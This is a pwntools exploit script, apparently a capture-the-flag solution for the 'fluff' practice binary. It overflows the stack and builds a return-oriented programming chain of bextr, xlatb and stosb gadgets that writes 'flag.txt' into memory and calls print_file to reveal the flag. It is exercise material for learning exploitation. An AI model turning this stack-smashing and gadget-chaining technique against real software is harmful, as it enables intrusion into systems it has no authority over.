from pwn import *

elf = ELF("./fluff")

p = process("./fluff")
p.recvuntil('> ')

stosb = p64(0x0000000000400639)
writable_area = p64(0x0000000000601028)
print_file = p64(0x400510)
pop_rdi = p64(0x00000000004006a3)
xlatb = p64(0x0000000000400628)
pop_bextr = p64(0x000000000040062a)

def prepare_rbx(target):
	rop = pop_bextr + p64(0x4000) + p64(target - 0x3ef2) # rdx = 0x4000, rcx = rcx - 0x3ef2
	return rop

def prepare_al(target, current_al, elf):
	rop = b""
	target_byte_addr = next(elf.search(target)) # search for char address
	rbx = target_byte_addr - current_al # fix address based on current_al for xlatb
	rop += prepare_rbx(rbx) 
	rop += xlatb
	return rop, target

# smash stack
payload = b'' 
payload += cyclic(40) # add random stuff
payload += pop_rdi + writable_area # write writable_area address in rdi

target = b'flag.txt' # set target file
prev_al = 0x0b # starting al

for b in target: # for char in flag.txt
	rop , prev_al = prepare_al(b, prev_al,elf) # prepare al
	payload += rop + stosb # chain stosb
	

payload += pop_rdi + writable_area + print_file # write writable_area address in rdi
	 

p.send(payload)					   
p.interactive()
